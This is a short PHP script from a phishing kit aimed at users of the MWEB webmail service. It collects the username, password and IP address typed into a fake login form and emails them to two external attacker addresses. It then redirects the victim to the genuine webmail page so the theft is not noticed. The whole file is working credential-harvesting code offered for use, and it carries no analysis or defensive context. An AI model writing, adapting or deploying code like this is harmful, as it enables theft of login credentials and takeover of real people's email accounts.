<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Cyber Mail Spam ReZulT-----------------------\n";
$message .= "Username : ".$_POST['user_id']."\n";
$message .= "password: ".$_POST['passwd']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Emp0w3r3d By Mr.DARK-----------------------------\n";

$recipient = "abaccolaw@yahoo.com, abaccolaw@hotmail.com";
$subject = "MWEB LOGS 2020 - $ip";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("", "SiteKeys Challenge ReZulT", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://www.mweb.co.za/webmail");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>